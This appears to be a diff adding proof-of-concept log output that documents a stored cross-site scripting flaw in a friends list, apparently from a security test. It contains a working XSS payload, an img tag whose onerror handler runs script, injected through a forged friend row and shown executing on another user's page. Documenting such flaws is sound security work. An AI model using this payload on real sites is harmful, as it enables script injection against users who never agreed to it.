@@ -1,0 +1,4 @@
+[A] login=true cid=1 first beat with 3000ms read lag -> {"r":{"ok":true},"openid":""}
+[C] wrote forged friend row (own row, legal under READONLY): true
+[A] after opening friends page: {"pwn":1,"title":"PWNED","imgInList":"<img src=\"x\" onerror=\"window.__pwn=(window.__pwn||0)+1;document.title='PWNED'\"> · 等他也加你为好友"}
+RESULT: stranger-controlled script executed on A's friends page
